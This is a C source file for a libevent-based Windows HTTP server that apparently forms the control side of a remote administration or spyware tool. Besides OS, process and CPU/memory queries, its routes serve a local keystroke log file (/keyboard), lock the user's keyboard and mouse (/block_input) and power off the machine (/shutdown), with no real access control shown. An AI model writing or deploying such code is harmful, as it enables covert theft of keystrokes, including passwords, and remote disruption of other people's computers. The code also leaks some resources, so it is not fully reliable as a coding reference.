#include "server.h"
#include "util.h"
#include "my_string.h"
#include <string.h>
#include "OSInfo.h"
#include "win_process.h"
#include "resource_monitor.h"
#include <event2/event.h>
#include <event2/buffer.h>
#include <event2/bufferevent.h>
#include <event2/http.h>


#pragma comment(lib, "ws2_32.lib")

#define MAX_COMP_NAME MAX_COMPUTERNAME_LENGTH + 1


#ifndef UNICODE
#define UNICODE
#endif

typedef enum evhttp_cmd_type ev_http_method_t;
typedef struct evhttp_request ev_http_request_t;



char * get_path(const ev_http_request_t * req)
{
    struct evhttp_uri * decoded = evhttp_uri_parse(evhttp_request_get_uri(req));
    const char *path = evhttp_uri_get_path(decoded);
        if (!path)
            path = "/";

    char *decoded_path = evhttp_uridecode(path, 0, NULL);
    if (decoded_path == NULL)
        return NULL;

    return decoded_path;
}

const char * GetRequestQuery(const ev_http_request_t * req)
{
    struct evhttp_uri * decoded = evhttp_uri_parse(evhttp_request_get_uri(req));
    return evhttp_uri_get_query(decoded);
}

void HttpReplyGetOsInfo(struct evhttp_request * request)
{
    POSInfo value = GetLatestOsInfo();
     
    
    char * result = OSInfoToJson(value);

    if (result) {
        struct evkeyvalq * p = evhttp_request_get_output_headers(request);

        evhttp_add_header(p, "Content-Type", MIME_JSON);
        len_t size = BytesLen(result);
        struct evbuffer * resp = evbuffer_new();
        evbuffer_add(resp, result, size);
        evhttp_send_reply(request, HTTP_OK, NULL, resp);
        evbuffer_free(resp);

    } else {
        evhttp_send_reply(request, HTTP_INTERNAL, NULL, NULL);
    }

    free(result);
    OSInfoFree(&value);
}



void HttpReplyBlockUserInput(struct evhttp_request * req)
{
    static boolean locked = false;
    int code = -1;
    if (locked) {
        BlockInput(FALSE);
        locked = false;
        code = HTTP_OK;
    } else {
        BlockInput(TRUE);
        locked = true;
        code = HTTP_CODE_CREATED;
    }

    evhttp_send_reply(req, code, NULL, NULL);
}

void HttpReplyShutdownSystem(struct evhttp_request * req, void * userdata)
{
    (void)userdata;
    ExitWindowsEx(EWX_POWEROFF, SHTDN_REASON_MAJOR_APPLICATION);
    evhttp_send_reply(req, HTTP_NOCONTENT, NULL, NULL);
}

#undef _USE_ENUM_PROC

static void _answer_cpu_memory_usage_impl(struct evhttp_request * req)
{
    resource_stats_t stats;
    if (collect_resource_stats(&stats)){

        byte * dat = resource_stats_to_json(&stats);

        if (dat) {

            struct evbuffer* resp = evbuffer_new();
            evbuffer_add(resp, dat, strlen(dat));
            
            evhttp_send_reply(req, HTTP_OK, NULL, resp);
            evbuffer_free(resp);
            free(dat);

            return;
        }

    }

    evhttp_send_error(req, HTTP_INTERNAL,NULL);

}

static void _send_kb_log_impl(struct evhttp_request * req)
{
    FILE * file = fopen("keylog.txt", "rb");
    if (!file) {
        evhttp_send_error(req, HTTP_INTERNAL, NULL);
        return;
    }

    fseek(file, 0, SEEK_END);
    very_long_t size = ftell(file);

    struct evbuffer * buf = evbuffer_new();

    if (size == ZERO) {
        evhttp_send_reply(req, HTTP_NOCONTENT, NULL, NULL);
        return;
    }

    evbuffer_add_file(buf, _fileno(file), 0, size);
    evhttp_add_header(evhttp_request_get_output_headers(req), HTTP_HEADER_CT, OCTET_STREAM);
    evhttp_send_reply(req, HTTP_OK, NULL, buf);
    evbuffer_free(buf);
}

void HttpReplyGeneric(struct evhttp_request * req, HttpPathCallbackType type, void * userdata)
{
    (void)userdata;
    if (type == TProcesses) {
        len_t count = 0;
        len_t allocated = 0;
        WinProcess * processes = RetrieveAllProcesses(&count, &allocated);

        if (processes && count) {
            byte* json = WinProcessToJson(processes, count);
            
            pstring_t str = CreateString(json, strlen(json), UTF_8);

            struct evbuffer * resp_body = evbuffer_new();
            
            evbuffer_add(resp_body, json, str->CurrentSize);
            evhttp_add_header(evhttp_request_get_output_headers(req), HTTP_HEADER_CT, MIME_JSON);
            evhttp_send_reply(req, HTTP_OK, NULL, resp_body);

            evbuffer_free(resp_body);
            StringDestroy(str);
            free(json);
            DestroyAllProcesses(processes, count);
            return;
        }

    }

    else if (type == TCpuMemory)
    {
        _answer_cpu_memory_usage_impl(req);
        return;
    }
    else if (type == TKeyBoardLog)
    {
        _send_kb_log_impl(req);
        return;
    }

    evhttp_send_reply(req, HTTP_NOCONTENT, NULL, NULL);
}

static const struct http_path paths[] = 
{
    {   .path = "/osinfo", 
        .status = STATUS_OPEN, 
        .method = HTTP_GET,
        .GetOsInfoCallback = &HttpReplyGetOsInfo, 
        .cb_type = TOsInfoCallback,
        .flags = PATH_FLAG_ACCESS_ALL
    },

    {   .path = "/block_input", 
        .status = STATUS_OPEN, 
        .method = HTTP_POST,
        .BlockUserInputCallback = &HttpReplyBlockUserInput, 
        .cb_type = TBlockInputCallback
    },

    {
        .path = "/shutdown",
        .method = HTTP_POST,
        .flags = PATH_FLAG_ACCESS_ALL,
        .cb_type = TShutdownSystemCallback,
        .ShutdownSystemCallback = &HttpReplyShutdownSystem
    },
    {
        .path = "/processes",
        .method = HTTP_GET,
        .cb_type = TProcesses,
        .GenericCallback = &HttpReplyGeneric
    },
    {
        .path = "/cpu_mem",
        .method = HTTP_GET,
        .cb_type = TCpuMemory,
    },
    {
        .path = "/keyboard",
        .method = HTTP_GET,
        .cb_type = TKeyBoardLog
    }
};






boolean isPathForbidden(const http_path_t * path)
{
    return path->flags & PATH_FLAG_FORBIDDEN;
}

boolean isThatMethod(const http_path_t * path, const char * given)
{
    return (!strcmp(path->method, given));
}


ev_http_method_t GetMethod(const ev_http_request_t * req)
{
    return evhttp_request_get_command(req);
}

const char * EvHttpMethodToString(ev_http_method_t i)
{
    switch (i) {
        case EVHTTP_REQ_GET: return "GET";
        case EVHTTP_REQ_POST: return "POST";
    }

    return NULL;
}


integer_t find_path(pstring_t path)
{
    const len_t size = sizeof(paths) / sizeof(paths[0]);
    for (len_t i = 0; i < size; i++) {

        pstring_t cmp_to = CreateString(paths[i].path, BytesLen(paths[i].path), UTF_8);
        
        if (StringEquals(path, cmp_to)) {
            StringDestroy(cmp_to);
            return (integer_t)i;
        }
        
        StringDestroy(cmp_to);
    }

    return -1;
}

boolean InitializeWSock()
{
    WSADATA wsaData;
    integer_t result =  WSAStartup(MAKEWORD(2,2), &wsaData);

    return (result == NO_ERROR);
}

void DetachWSock()
{
    WSACleanup();
}



// main callback
void HttpRequestCallback(struct evhttp_request *req, void *arg)
{
    (void)arg;
    char * path = get_path(req);
    const len_t len = BytesLen(path);
    pstring_t m_path = CreateString(path, len, UTF_8);

    integer_t index = find_path(m_path);

    if (index != -1) {

        const http_path_t * indexed_path = &paths[index];

        if (isPathForbidden(indexed_path)) {
            evhttp_send_error(req, HTTP_CODE_FORBIDDEN, NULL);
            goto cleanup;
            return;
        }

        const char * method = EvHttpMethodToString(GetMethod(req));

        if (method == NULL) {
            evhttp_send_error(req, HTTP_NOTIMPLEMENTED, NULL);
            goto cleanup;
            return;
        }

        if (!isThatMethod(indexed_path, method)) {
            evhttp_send_error(req, HTTP_BADMETHOD, NULL);
            goto cleanup;
            return;
        }

        switch (indexed_path->cb_type) {

            case TOsInfoCallback:
            indexed_path->GetOsInfoCallback(req);
                break;
            case TBlockInputCallback:
            indexed_path->BlockUserInputCallback(req);
                break;
            case TShutdownSystemCallback:
            indexed_path->ShutdownSystemCallback(req, NULL);
                break;
            case TProcesses:
            indexed_path->GenericCallback(req, TProcesses, NULL);    
                break;
            default:
                HttpReplyGeneric(req, indexed_path->cb_type, NULL);
        }

    } else {
        evhttp_send_error(req, HTTP_NOTFOUND, NULL);
        goto cleanup;
    }

    cleanup:
    {
        StringDestroy(m_path);
        free(path);
    }
}

integer_t RunServer(ushort_t port, const char* address)
{
    struct event_base *base;

    base = event_base_new();
    if (!base)
        return ServerEventError;

    struct evhttp * http_server = evhttp_new(base);
    evhttp_bind_socket(http_server, address, port);
    evhttp_set_gencb(http_server, HttpRequestCallback, NULL);
    
    printf("server started at on http://%s:%lu\n", address, port);

    event_base_dispatch(base);
    evhttp_free(http_server);

    return ServerErrorNoError;
}